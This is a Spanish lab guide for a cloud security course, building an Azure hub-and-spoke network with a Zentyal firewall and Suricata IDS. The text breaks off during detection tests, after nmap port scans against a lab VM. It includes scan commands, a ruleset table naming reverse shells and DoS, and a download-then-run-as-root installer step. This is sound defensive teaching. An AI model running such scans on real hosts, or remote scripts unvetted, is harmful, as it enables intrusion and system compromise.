# Guía de Laboratorio – Sesión 2
## Arquitectura Hub & Spoke en Azure con Zentyal (NVA/IDS-IPS), aplicación PaaS (App Service + Function App + Azure SQL) y CSPM con CloudSploit

> **Curso:** DevSecOps – Seguridad en Nubes Públicas
> **Docente:** Manuel Alejandro Vargas Rojas — manuelvargasrojas@cedoc.edu.co
> **Nivel:** Avanzado · **Uso:** interno
> **Versión SO (VMs):** Ubuntu 24.04 LTS (Noble Numbat)
> **Base:** migración y ampliación de [Cloud-Lab/Lab_HubSpoke_Zentyal.md](https://github.com/malevarro/Cloud-Lab/blob/main/Lab_HubSpoke_Zentyal.md)

Esta guía es **autocontenida**: construye la arquitectura Hub & Spoke con Zentyal como firewall/IDS-IPS (Parte I) y, sobre esa misma arquitectura, despliega una aplicación PaaS de tres capas (Parte II) y audita la postura de seguridad con CloudSploit (Parte III).

---

## Tabla de contenido

- [Guía de Laboratorio – Sesión 2](#guía-de-laboratorio--sesión-2)
  - [Arquitectura Hub \& Spoke en Azure con Zentyal (NVA/IDS-IPS), aplicación PaaS (App Service + Function App + Azure SQL) y CSPM con CloudSploit](#arquitectura-hub--spoke-en-azure-con-zentyal-nvaids-ips-aplicación-paas-app-service--function-app--azure-sql-y-cspm-con-cloudsploit)
  - [Tabla de contenido](#tabla-de-contenido)
- [PARTE I – ARQUITECTURA BASE HUB \& SPOKE CON ZENTYAL](#parte-i--arquitectura-base-hub--spoke-con-zentyal)
  - [Objetivo del laboratorio](#objetivo-del-laboratorio)
  - [Arquitectura de referencia](#arquitectura-de-referencia)
    - [Diagrama (arquitectura objetivo de la Parte I)](#diagrama-arquitectura-objetivo-de-la-parte-i)
  - [Requisitos previos](#requisitos-previos)
  - [Componentes del laboratorio](#componentes-del-laboratorio)
  - [Paso 1 – Creación del Resource Group](#paso-1--creación-del-resource-group)
  - [Paso 2 – Creación de la VNet Hub](#paso-2--creación-de-la-vnet-hub)
  - [Paso 3 – Creación de las VNets Spoke](#paso-3--creación-de-las-vnets-spoke)
  - [Paso 4 – Despliegue de máquinas virtuales Linux](#paso-4--despliegue-de-máquinas-virtuales-linux)
    - [4.1 – VM Zentyal en Hub (dual NIC)](#41--vm-zentyal-en-hub-dual-nic)
    - [4.2 – VMs en los Spokes](#42--vms-en-los-spokes)
  - [Paso 5 – Configuración de VNet Peering (Hub ↔ Spokes)](#paso-5--configuración-de-vnet-peering-hub--spokes)
  - [Paso 6 – Configuración de NSG por subred](#paso-6--configuración-de-nsg-por-subred)
    - [6.1 – NSG para Subnet-Back (Egress)](#61--nsg-para-subnet-back-egress)
    - [6.2 – NSG para Subnet-Front y Spokes (redes privadas)](#62--nsg-para-subnet-front-y-spokes-redes-privadas)
  - [Paso 7 – Instalación y configuración de Zentyal Server](#paso-7--instalación-y-configuración-de-zentyal-server)
    - [7.1 – Preparar acceso público a la VM](#71--preparar-acceso-público-a-la-vm)
    - [7.2 – Preparar el sistema operativo (SSH a `FW-Zentyal`)](#72--preparar-el-sistema-operativo-ssh-a-fw-zentyal)
    - [7.3 – Instalar Zentyal Server 8.1 Development Edition](#73--instalar-zentyal-server-81-development-edition)
    - [7.4 – Asistente de configuración inicial](#74--asistente-de-configuración-inicial)
    - [7.5 – Configurar interfaces en Zentyal](#75--configurar-interfaces-en-zentyal)
  - [Paso 8 – Configuración del Firewall en Zentyal](#paso-8--configuración-del-firewall-en-zentyal)
    - [8.1 – Habilitar módulos](#81--habilitar-módulos)
    - [8.2 – NAT / Masquerade](#82--nat--masquerade)
    - [8.3 – Reglas para tráfico desde redes internas](#83--reglas-para-tráfico-desde-redes-internas)
    - [8.4 – Reglas para tráfico desde redes externas](#84--reglas-para-tráfico-desde-redes-externas)
    - [8.5 – Verificar reglas (SSH)](#85--verificar-reglas-ssh)
  - [Paso 9 – Configuración del IDS/IPS en Zentyal (Suricata)](#paso-9--configuración-del-idsips-en-zentyal-suricata)
    - [9.1 – Habilitar el módulo](#91--habilitar-el-módulo)
    - [9.2 – Interfaces monitoreadas](#92--interfaces-monitoreadas)
    - [9.3 – Rulesets de Suricata](#93--rulesets-de-suricata)
    - [9.4 – Verificar Suricata (SSH)](#94--verificar-suricata-ssh)
  - [Paso 10 – Enrutamiento (UDR) para forzar tráfico a través de Zentyal](#paso-10--enrutamiento-udr-para-forzar-tráfico-a-través-de-zentyal)
  - [Paso 11 – Instalación de nmap y netcat en las VMs Spoke](#paso-11--instalación-de-nmap-y-netcat-en-las-vms-spoke)
  - [Paso 12 – Pruebas de detección por el IDS/IPS de Zentyal](#paso-12--pruebas-de-detección-por-el-idsips-de-zentyal)
    - [Prueba 1 – Conectividad Spoke-to-Spoke](#prueba-1--conectividad-spoke-to-spoke)
    - [Prueba 2 – Escaneo nmap (detección IDS)](#prueba-2--escaneo-nmap-detección-ids)
    - [Prueba 3 – Salida a Internet (verificar NAT)](#prueba-3--salida-a-internet-verificar-nat)
    - [Prueba 4 – Shell inversa con netcat (detección IPS)](#prueba-4--shell-inversa-con-netcat-detección-ips)
    - [Prueba 5 – Flood ICMP (DoS)](#prueba-5--flood-icmp-dos)
    - [Prueba 6 – Analizar alertas](#prueba-6--analizar-alertas)
- [PARTE II – APLICACIÓN PAAS SOBRE LA ARQUITECTURA](#parte-ii--aplicación-paas-sobre-la-arquitectura)
  - [Arquitectura objetivo de la Parte II](#arquitectura-objetivo-de-la-parte-ii)
  - [Variables de trabajo](#variables-de-trabajo)
  - [Paso 13 – Preparar la red para cargas PaaS](#paso-13--preparar-la-red-para-cargas-paas)
    - [13.1 – Subred delegada en Spoke1 (integración de la app)](#131--subred-delegada-en-spoke1-integración-de-la-app)
    - [13.2 – Subred de private endpoint en Spoke2 (datos)](#132--subred-de-private-endpoint-en-spoke2-datos)
    - [13.3 – Forzar el egreso de la app por Zentyal (UDR en la subred delegada)](#133--forzar-el-egreso-de-la-app-por-zentyal-udr-en-la-subred-delegada)
    - [13.4 – Zona DNS privada de Azure SQL enlazada a las VNets](#134--zona-dns-privada-de-azure-sql-enlazada-a-las-vnets)
  - [Paso 14 – Desplegar la base de datos (tier de datos, Spoke2)](#paso-14--desplegar-la-base-de-datos-tier-de-datos-spoke2)
    - [14.1 – Servidor y base de datos Azure SQL](#141--servidor-y-base-de-datos-azure-sql)
    - [14.2 – Deshabilitar acceso público (mínima exposición)](#142--deshabilitar-acceso-público-mínima-exposición)
    - [14.3 – Private endpoint de SQL en Spoke2](#143--private-endpoint-de-sql-en-spoke2)
    - [14.4 – Integrar el PE con la zona DNS privada](#144--integrar-el-pe-con-la-zona-dns-privada)
    - [14.5 – Autenticación con Microsoft Entra (sin contraseñas)](#145--autenticación-con-microsoft-entra-sin-contraseñas)
  - [Paso 15 – Desplegar App Service y Function App (tier de aplicación, Spoke1)](#paso-15--desplegar-app-service-y-function-app-tier-de-aplicación-spoke1)
    - [15.1 – App Service Plan (nivel con VNet integration)](#151--app-service-plan-nivel-con-vnet-integration)
    - [15.2 – App Service (web) con identidad administrada y hardening](#152--app-service-web-con-identidad-administrada-y-hardening)
    - [15.3 – Integrar el App Service a la subred delegada de Spoke1](#153--integrar-el-app-service-a-la-subred-delegada-de-spoke1)
    - [15.4 – Function App en el mismo plan Dedicated con VNet integration](#154--function-app-en-el-mismo-plan-dedicated-con-vnet-integration)
  - [Paso 16 – Conectar la aplicación a la BD a través de la arquitectura](#paso-16--conectar-la-aplicación-a-la-bd-a-través-de-la-arquitectura)
    - [16.1 – Permitir app→BD en el firewall Zentyal](#161--permitir-appbd-en-el-firewall-zentyal)
    - [16.2 – Usuario de la BD para la identidad de la app (Entra, sin contraseñas)](#162--usuario-de-la-bd-para-la-identidad-de-la-app-entra-sin-contraseñas)
    - [16.3 – Cadena de conexión sin secreto](#163--cadena-de-conexión-sin-secreto)
    - [16.4 – (Opcional) Código de prueba](#164--opcional-código-de-prueba)
  - [Paso 17 – Validación de la microsegmentación (Zentyal + Network Watcher)](#paso-17--validación-de-la-microsegmentación-zentyal--network-watcher)
    - [17.1 – Resolución DNS privada desde la app](#171--resolución-dns-privada-desde-la-app)
    - [17.2 – Confirmar el paso por Zentyal](#172--confirmar-el-paso-por-zentyal)
    - [17.3 – Rutas con Network Watcher](#173--rutas-con-network-watcher)
- [PARTE III – CSPM CON CLOUDSPLOIT](#parte-iii--cspm-con-cloudsploit)
  - [Paso 18 – CSPM con CloudSploit desde Azure Cloud Shell](#paso-18--cspm-con-cloudsploit-desde-azure-cloud-shell)
    - [18.1 – Service principal de solo lectura (menor privilegio)](#181--service-principal-de-solo-lectura-menor-privilegio)
    - [18.2 – Instalar CloudSploit (Cloud Shell ya trae Node.js y git)](#182--instalar-cloudsploit-cloud-shell-ya-trae-nodejs-y-git)
    - [18.3 – Configurar credenciales](#183--configurar-credenciales)
    - [18.4 – Ejecutar el escaneo](#184--ejecutar-el-escaneo)
    - [18.5 – Análisis dirigido a la arquitectura desplegada](#185--análisis-dirigido-a-la-arquitectura-desplegada)
- [CIERRE](#cierre)
  - [Validación avanzada – Azure Network Watcher](#validación-avanzada--azure-network-watcher)
    - [Rutas efectivas (Effective Routes)](#rutas-efectivas-effective-routes)
    - [Next Hop](#next-hop)
    - [Connection Troubleshoot (portal)](#connection-troubleshoot-portal)
    - [NSG efectivas](#nsg-efectivas)
  - [Limpieza de recursos](#limpieza-de-recursos)
  - [Solución de problemas frecuentes](#solución-de-problemas-frecuentes)
  - [Checklist de finalización](#checklist-de-finalización)
  - [Referencias](#referencias)

---

# PARTE I – ARQUITECTURA BASE HUB & SPOKE CON ZENTYAL

## Objetivo del laboratorio

El participante diseñará y desplegará paso a paso una arquitectura de red **Hub & Spoke** en Microsoft Azure, incorporando una máquina virtual Linux con **Zentyal Server Development Edition** actuando como **Firewall / Router (NVA)**, **IDS/IPS** y **gateway NAT** en la VNet Hub, con NSG por subred aplicando el principio de mínimo privilegio. Sobre esta arquitectura desplegará luego una aplicación PaaS y auditará la postura de seguridad.

Al finalizar la Parte I, el estudiante será capaz de:

- Crear **3 redes virtuales** (1 Hub y 2 Spoke).
- Desplegar **una VM Linux por VNet**, con **dual-NIC** para el nodo firewall.
- Instalar y configurar **Zentyal Server** como NVA con firewall, IDS/IPS y NAT.
- Configurar **VNet Peering** (Hub ↔ Spokes) con tráfico reenviado (forwarded traffic).
- Forzar tráfico **Spoke-to-Spoke** e **Internet** a través del firewall mediante **UDR**.
- Aplicar **NSG por subred** según requerimientos de mínimo privilegio.
- Instalar **nmap** y **netcat** en las VMs Spoke para generar tráfico de prueba.
- **Detectar** el tráfico generado mediante las alertas IDS/IPS de Zentyal (Suricata).
- Ejecutar **validación avanzada** con Azure Network Watcher.

## Arquitectura de referencia

Se toma como base la [topología de referencia Hub-spoke de Microsoft](https://learn.microsoft.com/en-us/azure/architecture/networking/architecture/hub-spoke). El firewall es **Zentyal Server**, que proporciona routing/NAT, firewall (iptables con GUI web) y módulo IDS/IPS basado en **Suricata**.

### Diagrama (arquitectura objetivo de la Parte I)

```
                        (Internet)
                             ^
                             |
                      [Azure SNAT/Outbound]
                             |
                    +------------------------------+
                    |    Hub-VNet  10.0.0.0/16     |
                    |                              |
 Spoke1 Peering     |      Subnet-Back             |     Spoke2 Peering
+----------------+  |      10.0.1.0/24             |  +----------------+
| Spoke1-VNet    |  |      (WAN / EGRESS)          |  | Spoke2-VNet    |
| 10.1.0.0/16    |  |      [NIC2 - eth1]           |  | 10.2.0.0/16    |
| WorkloadSubnet |  |           |                  |  | WorkloadSubnet |
| 10.1.0.0/24    +--+    +------------+            +--+ 10.2.0.0/24    |
| VM-Spoke1      |  |    | FW-Zentyal |               | VM-Spoke2      |
| nmap, nc       |  |    |   (NVA)    |               | nmap, nc       |
+----------------+  |    +------------+            |  +----------------+
                    |           |                  |
                    |      [NIC1 - eth0]           |
                    |      Subnet-Front            |
                    |      10.0.0.0/24             |
                    +------------------------------+

Rutas UDR en Spokes:
  0.0.0.0/0        → VirtualAppliance  (IP NIC1 Zentyal – Subnet-Front)
  Spoke1: 10.2.0.0/16 → VirtualAppliance
  Spoke2: 10.1.0.0/16 → VirtualAppliance
```

> **Nota:** la VM Zentyal es un router multi-interfaz. El IP forwarding debe habilitarse tanto en Azure (NICs) como en el sistema operativo Linux.

## Requisitos previos

- Suscripción activa de Azure con permisos **Owner** o **Contributor**.
- **Azure CLI** o **Azure Cloud Shell** disponible.
- Conocimientos básicos de redes IP, routing, Linux y administración de servicios.
- Cliente SSH (MobaXterm u otro) para acceso a las VMs — <https://mobaxterm.mobatek.net/download.html>.
- Navegador web moderno para la interfaz de administración de Zentyal (HTTPS).

## Componentes del laboratorio

| Componente | Nombre | Dirección / Detalle |
|---|---|---|
| Resource Group | `RG-Networking` | eastus |
| VNet Hub | `Hub-VNet` | 10.0.0.0/16 |
| Subnet Hub Front | `Subnet-Front` | 10.0.0.0/24 |
| Subnet Hub Back | `Subnet-Back` | 10.0.1.0/24 |
| VNet Spoke 1 | `Spoke1-VNet` | 10.1.0.0/16 |
| Subnet Spoke 1 | `WorkloadSubnet` | 10.1.0.0/24 |
| VNet Spoke 2 | `Spoke2-VNet` | 10.2.0.0/16 |
| Subnet Spoke 2 | `WorkloadSubnet` | 10.2.0.0/24 |
| VM Firewall/Zentyal | `FW-Zentyal` | 2 NICs (Front + Back) – Ubuntu 24.04 LTS |
| VM Spoke 1 | `VM-Spoke1` | 1 NIC – Ubuntu 24.04 LTS |
| VM Spoke 2 | `VM-Spoke2` | 1 NIC – Ubuntu 24.04 LTS |
| Tamaño VM Zentyal | `Standard_B2s` | **Mínimo:** 2 vCPU / 4 GB RAM (requerido por Zentyal) |
| Tamaño VMs Spoke | `Standard_B1ls` | Mínimo típico |

> ⚠️ **Importante:** Zentyal Server requiere al menos **2 vCPU y 2 GB de RAM**. No utilizar `Standard_B1ls` para el nodo firewall; usar `Standard_B2s` o superior.

---

## Paso 1 – Creación del Resource Group

```bash
az group create \
  --name RG-Networking \
  --location eastus
```

## Paso 2 – Creación de la VNet Hub

```bash
# Crear la VNet Hub
az network vnet create \
  --resource-group RG-Networking \
  --name Hub-VNet \
  --address-prefix 10.0.0.0/16

# Subnet-Front: tránsito de Spokes → NIC1 de Zentyal (eth0)
az network vnet subnet create \
  --resource-group RG-Networking \
  --vnet-name Hub-VNet \
  --name Subnet-Front \
  --address-prefix 10.0.0.0/24

# Subnet-Back: egress/Internet → NIC2 de Zentyal (eth1)
az network vnet subnet create \
  --resource-group RG-Networking \
  --vnet-name Hub-VNet \
  --name Subnet-Back \
  --address-prefix 10.0.1.0/24
```

## Paso 3 – Creación de las VNets Spoke

```bash
# Spoke 1 (será el tier de APLICACIÓN en la Parte II)
az network vnet create \
  --resource-group RG-Networking \
  --name Spoke1-VNet \
  --address-prefix 10.1.0.0/16 \
  --subnet-name WorkloadSubnet \
  --subnet-prefix 10.1.0.0/24

# Spoke 2 (será el tier de DATOS en la Parte II)
az network vnet create \
  --resource-group RG-Networking \
  --name Spoke2-VNet \
  --address-prefix 10.2.0.0/16 \
  --subnet-name WorkloadSubnet \
  --subnet-prefix 10.2.0.0/24
```

## Paso 4 – Despliegue de máquinas virtuales Linux

### 4.1 – VM Zentyal en Hub (dual NIC)

Zentyal requiere **Ubuntu 24.04 LTS** y un mínimo de `Standard_B2s`. Se crean dos NICs: una para la red interna (Subnet-Front) y otra para la salida a Internet (Subnet-Back).

```bash
# NIC Front (eth0 en Zentyal – red interna / tránsito Spokes)
az network nic create \
  --resource-group RG-Networking \
  --name fw-nic-front \
  --vnet-name Hub-VNet \
  --subnet Subnet-Front

# NIC Back (eth1 en Zentyal – salida Internet)
az network nic create \
  --resource-group RG-Networking \
  --name fw-nic-back \
  --vnet-name Hub-VNet \
  --subnet Subnet-Back

# Habilitar IP forwarding en ambas NICs (requerido para NVA en Azure)
az network nic update --resource-group RG-Networking --name fw-nic-front --ip-forwarding true
az network nic update --resource-group RG-Networking --name fw-nic-back  --ip-forwarding true

# Crear VM Zentyal con dual NIC
# Reemplazar <CONTRASEÑA_SEGURA> por una contraseña de su elección
az vm create \
  --resource-group RG-Networking \
  --name FW-Zentyal \
  --image Ubuntu2404 \
  --size Standard_B2s \
  --nics fw-nic-back fw-nic-front \
  --admin-username azureuser \
  --authentication-type password \
  --admin-password <CONTRASEÑA_SEGURA>
```

> **Nota sobre el orden de las NICs:** en Azure, la primera NIC listada (`fw-nic-back`) se convierte en la NIC primaria del sistema operativo. Verificar con `ip -br a` después de conectarse por SSH.

### 4.2 – VMs en los Spokes

```bash
# VM Spoke 1
az vm create \
  --resource-group RG-Networking \
  --name VM-Spoke1 \
  --image Ubuntu2404 \
  --size Standard_B1ls \
  --vnet-name Spoke1-VNet \
  --subnet WorkloadSubnet \
  --admin-username azureuser \
  --authentication-type password \
  --admin-password <CONTRASEÑA_SEGURA>

# VM Spoke 2
az vm create \
  --resource-group RG-Networking \
  --name VM-Spoke2 \
  --image Ubuntu2404 \
  --size Standard_B1ls \
  --vnet-name Spoke2-VNet \
  --subnet WorkloadSubnet \
  --admin-username azureuser \
  --authentication-type password \
  --admin-password <CONTRASEÑA_SEGURA>
```

## Paso 5 – Configuración de VNet Peering (Hub ↔ Spokes)

El peering debe permitir **forwarded traffic** para que el Hub actúe como nodo de tránsito NVA.

```bash
# Peering Spoke1 ↔ Hub
az network vnet peering create \
  --name Spoke1-to-Hub --resource-group RG-Networking \
  --vnet-name Spoke1-VNet --remote-vnet Hub-VNet \
  --allow-vnet-access --allow-forwarded-traffic

az network vnet peering create \
  --name Hub-to-Spoke1 --resource-group RG-Networking \
  --vnet-name Hub-VNet --remote-vnet Spoke1-VNet \
  --allow-vnet-access --allow-forwarded-traffic

# Peering Spoke2 ↔ Hub
az network vnet peering create \
  --name Spoke2-to-Hub --resource-group RG-Networking \
  --vnet-name Spoke2-VNet --remote-vnet Hub-VNet \
  --allow-vnet-access --allow-forwarded-traffic

az network vnet peering create \
  --name Hub-to-Spoke2 --resource-group RG-Networking \
  --vnet-name Hub-VNet --remote-vnet Spoke2-VNet \
  --allow-vnet-access --allow-forwarded-traffic
```

## Paso 6 – Configuración de NSG por subred

### 6.1 – NSG para Subnet-Back (Egress)

**Objetivo:** permitir todo el tráfico saliente a Internet, permitir SSH entrante (administración) y HTTPS al puerto 8443 (panel web de Zentyal). Bloquear cualquier otro tráfico entrante.

```bash
az network nsg create --resource-group RG-Networking --name NSG-Subnet-Back

# SSH inbound (administración del firewall)
az network nsg rule create \
  --resource-group RG-Networking --nsg-name NSG-Subnet-Back \
  --name Allow-SSH-Inbound --priority 100 --direction Inbound --access Allow \
  --protocol Tcp --source-address-prefix '*' --source-port-range '*' \
  --destination-address-prefix '*' --destination-port-range 22

# HTTPS 8443 inbound (portal web Zentyal)
az network nsg rule create \
  --resource-group RG-Networking --nsg-name NSG-Subnet-Back \
  --name Allow-HTTPS-Zentyal --priority 110 --direction Inbound --access Allow \
  --protocol Tcp --source-address-prefix '*' --source-port-range '*' \
  --destination-address-prefix '*' --destination-port-range 8443

# Todo el tráfico saliente
az network nsg rule create \
  --resource-group RG-Networking --nsg-name NSG-Subnet-Back \
  --name Allow-All-Outbound --priority 100 --direction Outbound --access Allow \
  --protocol '*' --source-address-prefix '*' --source-port-range '*' \
  --destination-address-prefix '*' --destination-port-range '*'

# Asociar a Subnet-Back
az network vnet subnet update \
  --resource-group RG-Networking --vnet-name Hub-VNet \
  --name Subnet-Back --network-security-group NSG-Subnet-Back
```

### 6.2 – NSG para Subnet-Front y Spokes (redes privadas)

**Objetivo:** permitir tráfico únicamente hacia/desde rangos privados RFC 1918.

```bash
az network nsg create --resource-group RG-Networking --name NSG-Internal-Networks

# Inbound desde rangos privados
az network nsg rule create \
  --resource-group RG-Networking --nsg-name NSG-Internal-Networks \
  --name Allow-Private-Inbound --priority 100 --direction Inbound --access Allow \
  --protocol '*' --source-address-prefixes 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 \
  --source-port-range '*' --destination-address-prefix '*' --destination-port-range '*'

# Outbound hacia rangos privados
az network nsg rule create \
  --resource-group RG-Networking --nsg-name NSG-Internal-Networks \
  --name Allow-Private-Outbound --priority 100 --direction Outbound --access Allow \
  --protocol '*' --source-address-prefix '*' --source-port-range '*' \
  --destination-address-prefixes 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 --destination-port-range '*'

# Asociar a Subnet-Front y subredes Spoke
az network vnet subnet update --resource-group RG-Networking --vnet-name Hub-VNet   --name Subnet-Front    --network-security-group NSG-Internal-Networks
az network vnet subnet update --resource-group RG-Networking --vnet-name Spoke1-VNet --name WorkloadSubnet --network-security-group NSG-Internal-Networks
az network vnet subnet update --resource-group RG-Networking --vnet-name Spoke2-VNet --name WorkloadSubnet --network-security-group NSG-Internal-Networks
```

**Validación de NSG (reglas efectivas en una NIC):**

```bash
az network nic list-effective-nsg --resource-group RG-Networking --name <NIC_NAME> -o table
```

## Paso 7 – Instalación y configuración de Zentyal Server

### 7.1 – Preparar acceso público a la VM

```bash
# IP pública estática para administración
az network public-ip create \
  --resource-group RG-Networking --name FW-Public-IP \
  --sku Standard --allocation-method Static

# Asociar la IP pública a la NIC Back (egress)
az network nic ip-config update \
  --resource-group RG-Networking --nic-name fw-nic-back \
  --name ipconfig1 --public-ip-address FW-Public-IP

# Obtener la IP pública asignada
az network public-ip show --resource-group RG-Networking --name FW-Public-IP --query "ipAddress" -o tsv

# Guardar la IP privada de la NIC Front (next-hop de las UDR)
FW_FRONT_IP=$(az network nic show --resource-group RG-Networking --name fw-nic-front \
  --query "ipConfigurations[0].privateIPAddress" -o tsv)
echo "FW Front IP (next-hop UDR): $FW_FRONT_IP"
```

### 7.2 – Preparar el sistema operativo (SSH a `FW-Zentyal`)

Conéctate por SSH a la IP pública con el usuario `azureuser`.

**7.2.1 – Verificar nomenclatura de interfaces.** El instalador de Zentyal 8.1 requiere interfaces con prefijo `eth`:

```bash
ip -br a
```

| Resultado | Acción |
|---|---|
| Interfaces con prefijo `eth` (`eth0`, `eth1`) | ✅ Continuar a 7.2.2 |
| Nombres predictivos (`enp3s0`, `ens5`) | ⚠️ Ejecutar el bloque GRUB siguiente |

> ⚠️ **Solo si NO usan prefijo `eth`:** forzar nomenclatura clásica vía GRUB y reiniciar:

```bash
sudo sed -i 's/GRUB_CMDLINE_LINUX_DEFAULT=".*"/GRUB_CMDLINE_LINUX_DEFAULT="net.ifnames=0 biosdevname=0"/' /etc/default/grub
sudo update-grub
sudo reboot
```

Tras el reinicio, reconectar y repetir `ip -br a` para confirmar `eth0`/`eth1`.

**7.2.2 – Actualizar todos los paquetes** (el instalador aborta si hay pendientes):

```bash
sudo apt update
sudo apt dist-upgrade -y
# Si quedan pendientes:
sudo dpkg --configure -a
sudo apt install -f
# Verificar:
apt list --upgradable 2>/dev/null   # solo debe mostrar "Listing..."
```

### 7.3 – Instalar Zentyal Server 8.1 Development Edition

El script del repositorio del curso incorpora el *user agent* necesario en los `wget` para evitar errores `403` al descargar la clave GPG desde `keys.zentyal.org`.

```bash
# Descargar el script personalizado
wget -U "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0" \
  -O zentyal_installer_8.1.sh \
  https://raw.githubusercontent.com/malevarro/Cloud-Lab/main/Firewall/zentyal_installer_8.1.sh

# Revisar antes de ejecutar (buena práctica)
less zentyal_installer_8.1.sh

# Ejecutar
chmod +x zentyal_installer_8.1.sh
sudo ./zentyal_installer_8.1.sh
```

Ante la pregunta `Do you want to install the Zentyal Graphical environment? (n|y)` responder **`n`**. La instalación tarda **10–20 min**. Al finalizar:

```
Installation complete, you can access the Zentyal Web Interface at:
  * https://<zentyal-ip-address>:8443/
```

### 7.4 – Asistente de configuración inicial

Accede a `https://<IP_PUBLICA_FW>:8443` (usuario `azureuser`, contraseña de la VM) y acepta el certificado autofirmado. **No reinicies el servidor** sin haber configurado el módulo de Red. Selecciona los módulos:

| Módulo | Función |
|---|---|
| **Firewall** | Filtrado de paquetes (requerido) |
| **Gateway / NAT** | Enrutamiento y NAT hacia Internet (requerido) |
| **IDS / IPS** | Detección/prevención con Suricata (requerido) |
| **Network** | Configuración de interfaces |

### 7.5 – Configurar interfaces en Zentyal

**Network → Interfaces**:

| Interfaz SO | NIC Azure | Rol en Zentyal | Subred |
|---|---|---|---|
| `eth0` | `fw-nic-back` (primaria) | **External** | Subnet-Back 10.0.1.0/24 |
| `eth1` | `fw-nic-front` | **Internal** | Subnet-Front 10.0.0.0/24 |

> Verifica la asignación real con `ip -br a` antes de asignar roles.

## Paso 8 – Configuración del Firewall en Zentyal

Tras cada cambio: **Save Changes → Apply**.

### 8.1 – Habilitar módulos
**Module Status** → activar **Firewall** y **Gateway** → Save → Apply.

### 8.2 – NAT / Masquerade
**Gateway → NAT Rules** → nueva regla: **Interface** `eth0` (External), **Masquerade** habilitado.

### 8.3 – Reglas para tráfico desde redes internas
**Firewall → Packet Filter → Filtering rules for traffic coming from internal networks** (de arriba a abajo):

| # | Nombre | Origen | Destino | Protocolo | Puerto | Acción |
|---|---|---|---|---|---|---|
| 1 | Allow-Established | Any | Any | Any | Any | **Allow** |
| 2 | Allow-ICMP-Spokes | 10.1.0.0/16, 10.2.0.0/16 | Any | ICMP | Any | **Allow** |
| 3 | Allow-DNS-Spokes | 10.1.0.0/16, 10.2.0.0/16 | Any | UDP | 53 | **Allow** |
| 4 | Allow-HTTP-Spokes | 10.1.0.0/16, 10.2.0.0/16 | Any | TCP | 80 | **Allow** |
| 5 | Allow-HTTPS-Spokes | 10.1.0.0/16, 10.2.0.0/16 | Any | TCP | 443 | **Allow** |
| 6 | Allow-SSH-S1toS2 | 10.1.0.0/16 | 10.2.0.0/16 | TCP | 22 | **Allow** |
| 7 | Allow-SSH-S2toS1 | 10.2.0.0/16 | 10.1.0.0/16 | TCP | 22 | **Allow** |
| 8 | Deny-All | Any | Any | Any | Any | **Deny** |

> En la Parte II agregaremos una regla **Allow-App-to-SQL** (1433) **antes** del `Deny-All`.

### 8.4 – Reglas para tráfico desde redes externas
**Firewall → Packet Filter → Filtering rules for traffic coming from external networks**:

| # | Nombre | Origen | Destino | Protocolo | Puerto | Acción |
|---|---|---|---|---|---|---|
| 1 | Allow-SSH-Admin | Any | FW-Zentyal | TCP | 22 | **Allow** |
| 2 | Allow-WebAdmin | Any | FW-Zentyal | TCP | 8443 | **Allow** |
| 3 | Deny-All-External | Any | Any | Any | Any | **Deny** |

### 8.5 – Verificar reglas (SSH)
```bash
sudo iptables -S
sudo iptables -t nat -S
```

## Paso 9 – Configuración del IDS/IPS en Zentyal (Suricata)

### 9.1 – Habilitar el módulo
**Module Status** → activar **IDS/IPS** → Save → Apply.

### 9.2 – Interfaces monitoreadas
**IDS/IPS → Configuration** → seleccionar `eth1` (Internal, tráfico de Spokes) y `eth0` (External, egress).

| Modo | Comportamiento | Recomendación |
|---|---|---|
| **IDS** | Solo detecta y alerta | Iniciar aquí |
| **IPS (Inline)** | Detecta y bloquea | Segunda fase |

### 9.3 – Rulesets de Suricata
**IDS/IPS → Rules** → habilitar:

| Ruleset | Detecta |
|---|---|
| `emerging-scan` | Escaneos de puertos (nmap) |
| `emerging-exploit` | Exploits genéricos |
| `emerging-policy` | Servicios/puertos no autorizados |
| `emerging-shellcode` | Shells inversas (netcat) |
| `emerging-dos` | Denegación de servicio (ICMP flood) |

### 9.4 – Verificar Suricata (SSH)
```bash
sudo systemctl status suricata
sudo tail -f /var/log/suricata/fast.log
sudo tail -f /var/log/suricata/eve.json | python3 -m json.tool | head -100
```

## Paso 10 – Enrutamiento (UDR) para forzar tráfico a través de Zentyal

```bash
# Tablas de rutas por Spoke
az network route-table create --name RT-Spoke1 --resource-group RG-Networking
az network route-table create --name RT-Spoke2 --resource-group RG-Networking

# Rutas Spoke1
az network route-table route create --resource-group RG-Networking --route-table-name RT-Spoke1 \
  --name DefaultToZentyal --address-prefix 0.0.0.0/0 --next-hop-type VirtualAppliance --next-hop-ip-address $FW_FRONT_IP
az network route-table route create --resource-group RG-Networking --route-table-name RT-Spoke1 \
  --name ToSpoke2 --address-prefix 10.2.0.0/16 --next-hop-type VirtualAppliance --next-hop-ip-address $FW_FRONT_IP

# Rutas Spoke2
az network route-table route create --resource-group RG-Networking --route-table-name RT-Spoke2 \
  --name DefaultToZentyal --address-prefix 0.0.0.0/0 --next-hop-type VirtualAppliance --next-hop-ip-address $FW_FRONT_IP
az network route-table route create --resource-group RG-Networking --route-table-name RT-Spoke2 \
  --name ToSpoke1 --address-prefix 10.1.0.0/16 --next-hop-type VirtualAppliance --next-hop-ip-address $FW_FRONT_IP

# Asociar a las subredes Spoke
az network vnet subnet update --resource-group RG-Networking --vnet-name Spoke1-VNet --name WorkloadSubnet --route-table RT-Spoke1
az network vnet subnet update --resource-group RG-Networking --vnet-name Spoke2-VNet --name WorkloadSubnet --route-table RT-Spoke2
```

## Paso 11 – Instalación de nmap y netcat en las VMs Spoke

Repetir en **VM-Spoke1** y **VM-Spoke2** (SSH):

```bash
sudo apt-get update
sudo apt-get install -y nmap
sudo apt-get install -y netcat-openbsd
nmap --version
nc -h 2>&1 | head -5
```

## Paso 12 – Pruebas de detección por el IDS/IPS de Zentyal

> **Monitoreo paralelo (en FW-Zentyal):** `sudo tail -f /var/log/suricata/fast.log` o **IDS/IPS → Dashboard**.

### Prueba 1 – Conectividad Spoke-to-Spoke
```bash
# En VM-Spoke1
ping -c 4 <IP_PRIVADA_VM_SPOKE2>
```
TTL = 62 indica 2 hops (paso por Zentyal).

### Prueba 2 – Escaneo nmap (detección IDS)
```bash
sudo nmap -sS -p 22,80,443,8080,3389 <IP_PRIVADA_VM_SPOKE2>
sudo nmap -sV -p 22 <IP_PRIVADA_VM_SPOKE2>
